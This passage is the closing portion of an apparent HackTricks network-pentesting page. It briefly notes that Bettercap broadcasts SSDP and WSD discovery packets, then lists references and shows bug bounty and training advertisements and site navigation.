<p>Bettercap广播SSDP数据包，搜索各种服务（UDP端口1900）。</p>
<h3 id="wsd-web-service-discovery"><a class="header" href="#wsd-web-service-discovery"><strong>WSD (Web Service Discovery)</strong></a></h3>
<p>Bettercap广播WSD数据包，搜索服务（UDP端口3702）。</p>
<h2 id="references"><a class="header" href="#references">References</a></h2>
<ul>
<li><a href="https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9">https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9</a></li>
<li><strong>Network Security Assessment: Know Your Network (3rd edition)</strong></li>
<li><strong>Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood</strong></li>
<li><a href="https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9">https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9</a></li>
</ul>
<p><img src="../../.gitbook/assets/i3.png" alt="" data-size="original"><br />
<strong>Bug bounty tip</strong>: <strong>sign up</strong> for <strong>Intigriti</strong>, a premium <strong>bug bounty platform created by hackers, for hackers</strong>! Join us at <a href="https://go.intigriti.com/hacktricks"><strong>https://go.intigriti.com/hacktricks</strong></a> today, and start earning bounties up to <strong>$100,000</strong>!</p>
<p>{% embed url="https://go.intigriti.com/hacktricks" %}</p>
<p>{% hint style="success" %}
Learn &amp; practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
Learn &amp; practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>Support HackTricks</summary>
<ul>
<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
<li><strong>Join the</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> or the <a href="https://t.me/peass"><strong>telegram group</strong></a> or <strong>follow</strong> us on <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../generic-methodologies-and-resources/external-recon-methodology/github-leaked-secrets.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../generic-methodologies-and-resources/pentesting-network/dhcpv6.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../generic-methodologies-and-resources/external-recon-methodology/github-leaked-secrets.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../generic-methodologies-and-resources/pentesting-network/dhcpv6.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
